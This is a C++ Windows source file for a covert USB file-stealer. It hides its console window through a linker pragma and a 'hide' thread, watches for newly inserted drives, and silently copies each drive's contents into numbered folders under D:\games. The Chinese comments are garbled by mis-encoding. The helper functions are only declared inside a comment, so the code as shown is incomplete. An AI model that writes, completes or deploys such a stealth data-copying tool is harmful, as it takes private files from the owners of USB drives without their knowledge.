#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
#include <set>
using namespace std;

int usbnums;
char usbname[20];
char src[20] = "X:\\";
char dest[20] = "D:\\games\\files[X]\\";
set<int> currentdisks;
vector<int> newdisks;

HANDLE hthread_hide = NULL;
UINT DiskType;

/*----------------------------------------------------------------------------
void copy();					//���ƹ���
int diskstatus();				//û�仯����0,��������1���˳�����2
DWORD WINAPI hide(LPVOID);		//hide�߳�����cmd���ڣ�һ�����ּ������������
----------------------------------------------------------------------------*/


int main() {

	usbnums = 0;

	while (true) {
		int status = diskstatus();
		if (status == 1) {	//�����̷�
			for (int i = 0; i < newdisks.size(); i++) {
				sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
				src[0] = newdisks[i];
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy();
				usbnums++;
			}
			newdisks.clear();
		} else if (status == 0)	//�����̷�
			Sleep(1000);
		else ;	//�̷��˳�
	}
	return 0;
}